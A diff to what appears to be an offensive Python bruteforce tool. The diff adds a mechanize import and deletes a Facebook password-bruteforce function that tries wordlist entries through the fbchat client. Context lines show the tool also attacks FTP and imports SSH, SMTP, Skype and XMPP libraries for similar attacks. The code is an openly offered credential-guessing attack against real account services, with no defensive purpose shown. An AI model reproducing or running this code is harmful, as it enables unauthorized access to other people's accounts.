@@ -20,10 +20,11 @@ from random import *
 
 # New stuff! Should be installed thru requirements.txt.
 
-import smtplib, argparse, paramiko, skpy
+import smtplib, argparse, paramiko, skpy, mechanize
 from fbchat import *
 from xmpp import *
 from ftplib import FTP
+
 
 # Global variables for color
 W = '\033[0m'  # white (normal)
@@ -35,18 +36,7 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
-# TODO: FIXXXXXXX!
-def facebookBruteforce(username, wordlist, delay):
-    wordlist = open(wordlist, 'r')
-    for i in wordlist.readlines():
-        password = i.strip("\n")
-        try:
-            client = Client(str(username), password)
-            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
-            exit()
-        except:
-             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-             sleep(delay)
+
 
 ################################################################
 # FTP bruteforce attack! Works like other attacks. Connects to
